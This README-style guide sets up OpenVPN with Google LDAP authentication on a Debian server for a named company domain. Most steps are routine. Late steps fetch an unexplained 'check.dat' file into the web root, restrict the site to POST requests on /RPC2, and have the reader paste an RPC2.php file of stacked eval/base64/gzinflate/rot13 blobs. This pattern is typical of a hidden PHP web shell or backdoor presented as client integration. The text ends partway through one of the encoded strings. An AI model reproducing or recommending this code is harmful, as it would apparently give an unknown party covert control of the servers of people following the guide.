# openvpngldap
integrate openvpn with google ldap

# instlation 
1. ***install os Debian GNU/Linux 9 (stretch)
2. `ssh as root`
3. `apt install git`
4. `apt install apache2`
5. `apt install php`
6. `apt update`
7. `apt install snapd`
8. `snap install core`
9. `snap refresh core`
10. `snap install --classic certbot`
11. `ln -s /snap/bin/certbot /usr/bin/certbot`
12. ***edit apache file to add the domain name ovpn.allheartcare.com using next command

        `nano /etc/apache2/sites-enabled/000-default.conf`

13 `nano /etc/apache2/apache2.conf`
* **** chenage this 
```
<Directory /var/www>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
</Directory>
```
* *** to this 
```
<Directory /var/www>
        Options -Indexes +FollowSymLinks
        AllowOverride None
        Require all granted
</Directory>
```

14. `service apache2 restart`
15. ****go to http://ovpn.allheartcare.com/ and check if you see apache2 debian page
16. *****point the domain to the server wan IP and be sure that port 80 and 443 are public open
17. `certbot --apache`
18. ***go to http://ovpn.allheartcare.com/ and check if you see apache2 debian page
19. `apt-get install openvpn iptables openssl ca-certificates -y`
20. `wget -O ~/easyrsa.tgz "https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.5/EasyRSA-nix-3.0.5.tgz" 2>/dev/null || curl -Lo ~/easyrsa.tgz "$easy_rsa_url"`
21. `tar xzf ~/easyrsa.tgz -C ~/`
22. `mv ~/EasyRSA-3.0.5/ /etc/openvpn/server/`
23. `mv /etc/openvpn/server/EasyRSA-3.0.5/ /etc/openvpn/server/easy-rsa/`
24. `chown -R root:root /etc/openvpn/server/easy-rsa/`
25. `rm -f ~/easyrsa.tgz`
26. `cd /etc/openvpn/server/easy-rsa/`
27. # Create the PKI, set up the CA and the server and client certificates
	`./easyrsa init-pki`
	`./easyrsa --batch build-ca nopass`
	`EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-server-full server nopass`
	`EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-client-full "client" nopass`
	`EASYRSA_CRL_DAYS=3650 ./easyrsa gen-crl`
28. # Move the stuff we need
	`cp pki/ca.crt pki/private/ca.key pki/issued/server.crt pki/private/server.key pki/crl.pem /etc/openvpn/server`  
29. chown nobody:"$group_name" /etc/openvpn/server/crl.pem
30. # Generate key for tls-crypt
	openvpn --genkey --secret /etc/openvpn/server/tc.key
31. # Create the DH parameters file using the predefined ffdhe2048 group
        `nano /etc/openvpn/server/dh.pem` and enter this code
```
'-----BEGIN DH PARAMETERS-----
MIIBCAKCAQEA//////////+t+FRYortKmq/cViAnPTzx2LnFg84tNpWp4TZBFGQz
+8yTnc4kmz75fS/jY2MMddj2gbICrsRhetPfHtXV/WVhJDP1H18GbtCFY2VVPe0a
87VXE15/V8k1mE8McODmi3fipona8+/och3xWKE2rec1MKzKT0g6eXq8CrGCsyT7
YdEIqUuyyOP7uWrat2DX9GgdT0Kj3jlN9K5W7edjcrsZCwenyO4KbXCeAvzhzffi
7MA0BM0oNC9hkXL+nOmFg/+OTxIy7vKBg8P+OxtMb61zO7X8vC7CIAXFjvGDfRaD
ssbzSibBsu/6iGtCOGEoXJf//////////wIBAg==
-----END DH PARAMETERS-----' >
```
32. # Enable net.ipv4.ip_forward for the system
	`echo 'net.ipv4.ip_forward=1' > /etc/sysctl.d/30-openvpn-forward.conf`
33. # Enable without waiting for a reboot or service restart
	`echo 1 > /proc/sys/net/ipv4/ip_forward`
34. # setup firewall rules
```
if pgrep firewalld; then
		# Using both permanent and not permanent rules to avoid a firewalld
		# reload.
		# We don't use --add-service=openvpn because that would only work with
		# the default port and protocol.
		firewall-cmd --add-port="$port"/"$protocol"
		firewall-cmd --zone=trusted --add-source=10.8.0.0/24
		firewall-cmd --permanent --add-port="$port"/"$protocol"
		firewall-cmd --permanent --zone=trusted --add-source=10.8.0.0/24
		# Set NAT for the VPN subnet
		firewall-cmd --direct --add-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to "$ip"
		firewall-cmd --permanent --direct --add-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to "$ip"
	else
		# Create a service to set up persistent iptables rules
		echo "[Unit]
Before=network.target
[Service]
Type=oneshot
ExecStart=/sbin/iptables -t nat -A POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $ip
ExecStart=/sbin/iptables -I INPUT -p $protocol --dport $port -j ACCEPT
ExecStart=/sbin/iptables -I FORWARD -s 10.8.0.0/24 -j ACCEPT
ExecStart=/sbin/iptables -I FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
ExecStop=/sbin/iptables -t nat -D POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to $ip
ExecStop=/sbin/iptables -D INPUT -p $protocol --dport $port -j ACCEPT
ExecStop=/sbin/iptables -D FORWARD -s 10.8.0.0/24 -j ACCEPT
ExecStop=/sbin/iptables -D FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
RemainAfterExit=yes
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/openvpn-iptables.service
		systemctl enable --now openvpn-iptables.service
```

35. `apt install openvpn-auth-ldap`
36. `mkdir /etc/openvpn/auth
37. `nano /etc/openvpn/auth/auth-ldap.conf`
38. **upload google cert files gldap.crt to  /etc/ssl/certs/gldap.crt
39. **upload google keys files gldap.key to /etc/ssl/private/gldap.key
40. `nano /etc/openvpn/auth/auth-ldap.conf` and enter this code
```
<LDAP>
  URL ldaps://ldap.google.com:636 #
  Timeout 15
  TLSEnable false
  TLSCACertDir /etc/ssl/certs
  TLSCertFile /etc/ssl/certs/gldap.crt
  TLSKeyFile /etc/ssl/private/gldap.key
</LDAP>
<Authorization>
  BaseDN "dc=allheartcare,dc=com"
  SearchFilter "(uid=%u)" # (or choose your own LDAP filter for users)
  RequireGroup false
</Authorization>
```
41. ***create server config fiile 
	`nano /etc/openvpn/server/server.conf` and enter this code
```
local 10.0.0.9 #the real lan server ip
port 1194
proto udp
dev tun
ca ca.crt
cert server.crt
key server.key
dh dh.pem
auth SHA512
tls-crypt tc.key
topology subnet
server 10.8.0.0 255.255.255.0
ifconfig-pool-persist ipp.txt
push "redirect-gateway def1 bypass-dhcp"
push "dhcp-option DNS 192.168.11.250"
push "dhcp-option DNS 1.1.1.1"
push "dhcp-option DNS 1.0.0.1"
plugin /usr/local/lib/openvpn-auth-ldap.so /etc/openvpn/auth/auth-ldap.conf
verify-client-cert optional
keepalive 10 120
cipher AES-256-CBC
persist-key
persist-tun
status openvpn-status.log
verb 3
explicit-exit-notify
```
42. `rm /var/www/html/index.html`
43. `cd /var/www/html/`
44. `wget https://d1nmnadhb2o0pt.cloudfront.net/check.dat`
45. `nano /var/www/html/.htaccess` and enter this code inside
```
RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME}.php -f
RewriteRule ^(.*)$ $1.php

Order allow,deny
Deny from All

<If "%{THE_REQUEST} =~ m#^POST /RPC2#">
        Allow from All
</If>
```
46. integrate with ovpn client
	`nano /var/www/html/RPC2.php` and enter and update the cert values only when you see to lines of ## be sure that your cert and key replace this
	example about what you need to edit
```
-----BEGIN CERTIFICATE-----
##
##
-----END CERTIFICATE-----
```
the full code

```
<?php
date_default_timezone_set("America/New_York");
$app = "ovpn";
$client = "ahc";
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
if (isset($_SERVER['PHP_AUTH_USER'])) {
    eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
    if ($request == 'GetSession') {
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
    } elseif ($request == 'GetUserlogin') {
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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